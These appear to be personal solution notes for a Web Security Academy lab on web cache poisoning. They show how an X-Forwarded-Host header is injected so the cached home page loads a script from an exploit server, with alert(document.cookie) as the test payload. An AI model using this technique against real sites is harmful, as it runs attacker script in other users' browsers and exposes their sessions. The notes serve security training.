/*

1) the user frequently visits the / home page so thats gotta be cached

2) Intercept the GET / request, we get following observations:
// an X-Cache header which goes from miss to hit
// in the response, we get,
<script type="text/javascript" 
    src="//LAB-ID.web-security-academy.net/resources/js/tracking.js">

3) Sent to repeater, 
GET / 
X-Forwarded-Host: chch.com
//     <script type="text/javascript" src="//chchc.com/resources/js/tracking.js">
        </script>


4) set the exploit server filename to /resources/js/tracking.js
    and X-Forwarded Host: Exploit server id

GET / HTTP/2
Host: 0a350078036049c1802aa862009e0000.web-security-academy.net
X-Forwarded-Host: exploit-0a9b001b039649e28065a7fc01c700cb.exploit-server.net

5) in the body of the exploit server file 
alert(document.cookie)
store

6) send and refresh / page till X-Cache: hit


*/